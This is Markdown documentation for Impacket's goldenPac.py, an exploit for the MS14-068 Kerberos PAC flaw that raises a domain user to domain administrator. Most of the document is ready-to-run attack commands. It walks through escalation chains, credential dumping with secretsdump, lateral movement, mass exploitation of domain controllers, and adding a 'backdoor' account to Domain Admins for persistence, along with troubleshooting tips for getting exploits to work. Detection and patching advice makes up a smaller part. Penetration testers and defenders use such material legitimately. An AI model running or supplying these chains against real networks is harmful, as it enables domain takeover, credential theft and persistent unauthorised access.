# goldenPac.py

## Overview
`goldenPac.py` is an MS14-068 Kerberos vulnerability exploit tool that forges a golden PAC to escalate privileges from a domain user to domain administrator. This tool exploits a critical flaw in how Windows validates PAC (Privilege Attribute Certificate) signatures in Kerberos tickets.

## Detailed Description
This script implements the MS14-068 exploit, which takes advantage of a vulnerability in Microsoft's Kerberos implementation. The exploit allows any domain user to forge a PAC that claims they have domain administrator privileges. The tool creates a golden ticket with a forged PAC, establishes an SMB connection to the target, and can execute commands with elevated privileges using PSExec-like functionality.

The vulnerability (CVE-2014-6324) affects Windows Server 2003, 2008, 2008 R2, 2012, and 2012 R2 domain controllers that haven't been patched. It's considered one of the most critical Active Directory vulnerabilities as it allows instant privilege escalation from any domain user account.

### Key Features:
- **MS14-068 Exploitation**: Implements the Kerberos PAC validation bypass
- **Golden PAC Creation**: Forges PAC claiming domain administrator privileges
- **Automatic Execution**: Establishes SMB connection and executes commands
- **Ticket Saving**: Can save forged tickets for later use
- **Multiple Encryption**: Supports both RC4 and AES256 encryption
- **Flexible Execution**: Upload files or execute commands directly

### Technical Details:
- Exploits CVE-2014-6324 in Windows Kerberos implementation
- Creates forged PAC with domain administrator privileges
- Uses modified TGS-REQ with crafted PAC signature
- Establishes SMB connection with elevated privileges
- Compatible with Windows Server 2003-2012 R2 (unpatched)

## Command Line Options

```
usage: goldenPac.py [-h] [-ts] [-debug] [-c pathname] [-w pathname] [-dc-ip ip address] 
                    [-target-ip ip address] [-hashes LMHASH:NTHASH]
                    target [command ...]

MS14-068 Exploit. It establishes a SMBConnection and PSEXEcs the target or saves the TGT for later use.

Required Arguments:
  target                [[domain/]username[:password]@]<targetName>

Optional Arguments:
  command               Command (or arguments if -c is used) to execute at target
                        Defaults to cmd.exe. 'None' will not execute PSEXEC
  -ts                   Adds timestamp to every logging output
  -debug                Turn DEBUG output ON

File Operations:
  -c pathname           Uploads the filename for later execution, arguments passed in command option
  -w pathname           Writes the golden ticket in CCache format into the <pathname> file

Network Options:
  -dc-ip ip address     IP Address of the domain controller (needed to get user's SID)
                        If omitted, uses domain part (FQDN) from target parameter
  -target-ip ip address IP Address of the target host. If omitted, uses targetName parameter

Authentication:
  -hashes LMHASH:NTHASH NTLM hashes, format is LMHASH:NTHASH
```
## Usage Examples

### Basic MS14-068 Exploitation
```bash
# Basic exploitation with password prompt
python3 goldenPac.py domain.net/normaluser@domain-host

# With explicit password
python3 goldenPac.py domain.net/normaluser:password@domain-host

# Using NTLM hash authentication
python3 goldenPac.py -hashes :ntlmhash domain.net/normaluser@domain-host
```

### Network Configuration Examples
```bash
# Specify domain controller and target IPs explicitly
python3 goldenPac.py -dc-ip 192.168.1.10 -target-ip 192.168.1.20 domain.net/normaluser:password@domain-host

# When domain names don't resolve (add to /etc/hosts or use IPs)
python3 goldenPac.py -dc-ip 10.10.10.5 -target-ip 10.10.10.10 contoso.local/user:pass@dc01.contoso.local
```

### Command Execution Examples
```bash
# Execute specific command
python3 goldenPac.py domain.net/normaluser:password@domain-host whoami

# Upload and execute file
python3 goldenPac.py -c /tmp/payload.exe domain.net/normaluser:password@domain-host arg1 arg2

# Multiple commands
python3 goldenPac.py domain.net/normaluser:password@domain-host "net user backdoor Password123! /add"
```

### Ticket Saving for Later Use
```bash
# Save golden ticket without executing PSExec
python3 goldenPac.py -w /tmp/golden.ccache domain.net/normaluser:password@domain-host None

# Use saved ticket with other Impacket tools
export KRB5CCNAME=/tmp/golden.ccache
python3 secretsdump.py -k -no-pass domain.net/normaluser@dc.domain.net
```

### Advanced Usage Examples
```bash
# Debug mode for troubleshooting
python3 goldenPac.py -debug domain.net/normaluser:password@domain-host

# With timestamps for logging
python3 goldenPac.py -ts domain.net/normaluser:password@domain-host

# Upload PowerShell script and execute
python3 goldenPac.py -c /tmp/script.ps1 domain.net/normaluser:password@domain-host -ExecutionPolicy Bypass
```

## Attack Chain Integration

### Post-Exploitation Privilege Escalation
```bash
# Step 1: Obtain low-privilege domain user credentials
python3 GetNPUsers.py domain.net/ -usersfile users.txt -no-pass

# Step 2: Use MS14-068 to escalate to domain admin
python3 goldenPac.py domain.net/lowprivuser:password@dc.domain.net

# Step 3: Dump all domain credentials
python3 secretsdump.py -k -no-pass domain.net/lowprivuser@dc.domain.net
```

### Lateral Movement with Golden PAC
```bash
# Step 1: Exploit MS14-068 and save ticket
python3 goldenPac.py -w /tmp/golden.ccache domain.net/user:pass@dc.domain.net None

# Step 2: Use ticket for lateral movement
export KRB5CCNAME=/tmp/golden.ccache
python3 wmiexec.py -k -no-pass domain.net/user@server1.domain.net
python3 wmiexec.py -k -no-pass domain.net/user@server2.domain.net
```

### Persistence Through Golden PAC
```bash
# Step 1: Create golden PAC ticket
python3 goldenPac.py -w /tmp/persistent.ccache domain.net/user:pass@dc.domain.net None

# Step 2: Create backdoor account with ticket
export KRB5CCNAME=/tmp/persistent.ccache
python3 psexec.py -k -no-pass domain.net/user@dc.domain.net
# Inside PSExec shell:
# net user backdoor P@ssw0rd123! /add /domain
# net group "Domain Admins" backdoor /add /domain
```

### Mass Exploitation Across Domain
```bash
# Step 1: Identify vulnerable domain controllers
nmap -p 88 -sV domain-range/24

# Step 2: Test MS14-068 on each DC
python3 goldenPac.py domain.net/user:pass@dc1.domain.net whoami
python3 goldenPac.py domain.net/user:pass@dc2.domain.net whoami

# Step 3: Extract secrets from all accessible DCs
python3 goldenPac.py -w dc1.ccache domain.net/user:pass@dc1.domain.net None
python3 goldenPac.py -w dc2.ccache domain.net/user:pass@dc2.domain.net None
```

## Prerequisites
- Python 3.x with Impacket installed
- Valid domain user credentials (any privilege level)
- Network access to domain controller
- Target domain controller vulnerable to MS14-068 (unpatched)
- FQDN resolution or explicit IP addresses for domain and target
- SMB access to target host (port 445)

## Vulnerability Details

### MS14-068 (CVE-2014-6324)
- **Affected Systems**: Windows Server 2003, 2008, 2008 R2, 2012, 2012 R2
- **Root Cause**: Improper validation of PAC signatures in Kerberos tickets
- **Impact**: Any domain user can escalate to domain administrator
- **CVSS Score**: 10.0 (Critical)
- **Patch Date**: November 2014

### Technical Exploitation Details:
- Forges a PAC claiming domain administrator privileges
- Bypasses signature validation through crafted checksum
- Creates TGS-REQ with malicious PAC structure
- Domain controller trusts forged PAC without proper validation

## Detection Considerations
- **Event IDs**:
  - 4624: Account logon with unusual privileges
  - 4672: Special privileges assigned to new logon
  - 4768: Kerberos TGT requested (with anomalous PAC)
  - 4769: Kerberos service ticket requested
- **Network Indicators**:
  - Unusual Kerberos ticket requests from low-privilege accounts
  - Immediate privilege escalation after ticket requests
  - Administrative actions from previously non-admin accounts
- **Behavioral Indicators**:
  - Low-privilege accounts performing admin tasks
  - Sudden access to high-value resources
  - PSExec or WMI execution from compromised accounts

## Defensive Measures
- **Immediate Actions**:
  - Apply Microsoft security update MS14-068 immediately
  - Monitor for unusual privilege escalations
  - Implement additional PAC validation
- **Long-term Security**:
  - Regular patch management processes
  - Kerberos security monitoring
  - Privileged access management (PAM)
  - Network segmentation to limit blast radius
- **Detection Implementation**:
  - Deploy behavioral analysis tools
  - Monitor Kerberos authentication patterns
  - Implement anomaly detection for privilege changes

## Common Issues and Troubleshooting

### Name Resolution Issues
```bash
# Error: "Name resolution failed"
# Solution: Add entries to /etc/hosts or use IP addresses
echo "192.168.1.10 dc.domain.net domain.net" >> /etc/hosts
python3 goldenPac.py -dc-ip 192.168.1.10 -target-ip 192.168.1.10 domain.net/user:pass@dc.domain.net
```

### Clock Skew Problems
```bash
# Error: "Clock skew too great"
# Solution: Synchronize time with domain controller
ntpdate dc.domain.net
python3 goldenPac.py domain.net/user:pass@dc.domain.net
```

### Already Patched Systems
```bash
# Error: Exploitation fails on patched systems
# Solution: Verify patch status and consider alternative methods
python3 goldenPac.py -debug domain.net/user:pass@dc.domain.net
# Look for specific error messages indicating patch presence
```

### Network Connectivity Issues
```bash
# Error: "Connection refused" or timeout
# Solution: Verify network access and firewall settings
# Check SMB (445), Kerberos (88), and RPC (135) ports
nmap -p 88,135,445 dc.domain.net
```

## Related Tools
- [ticketer.py](ticketer.md) - Create golden/silver tickets (alternative method)
- [psexec.py](psexec.md) - Execute commands after privilege escalation
- [secretsdump.py](secretsdump.md) - Extract credentials with elevated privileges
- [wmiexec.py](wmiexec.md) - WMI-based command execution
- [GetNPUsers.py](GetNPUsers.md) - Obtain initial domain user credentials
- [lookupsid.py](lookupsid.md) - Enumerate domain users and groups

---

*This documentation is based on the actual source code and functionality of goldenPac.py from Impacket.*
